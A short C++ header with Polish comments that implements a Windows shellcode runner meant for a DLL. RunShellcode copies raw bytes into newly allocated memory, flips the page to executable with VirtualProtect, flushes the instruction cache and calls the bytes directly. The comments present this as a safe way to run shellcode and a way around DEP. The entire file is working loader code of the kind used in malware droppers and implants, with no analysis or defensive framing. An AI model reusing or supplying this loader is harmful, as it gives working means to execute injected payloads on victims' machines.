#pragma once
#include <windows.h>

#define DLLEXPORT __declspec(dllexport)

/* Wlasne memcpy — clang++ mingw nie linkuje libc domyslnie */
static inline void mv_memcpy(void* dst, const void* src, size_t n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    for (size_t i = 0; i < n; i++)
        d[i] = s[i];
}

/*
 * Bezpieczne uruchomienie shellcode:
 *   - kopiuje bajty do swiezej strony RWX -> RX (obejscie DEP)
 *   - FlushInstructionCache
 *   - VirtualFree po powrocie
 */
inline auto RunShellcode(const unsigned char* data, size_t size) -> void {
    if (data == nullptr || size == 0)
        return;

    LPVOID mem = VirtualAlloc(nullptr, size,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (mem == nullptr)
        return;

    mv_memcpy(mem, data, size);

    DWORD oldProtect = 0;
    if (!VirtualProtect(mem, size, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }

    FlushInstructionCache(GetCurrentProcess(), mem, size);

    ((void(*)())mem)();

    VirtualFree(mem, 0, MEM_RELEASE);
}
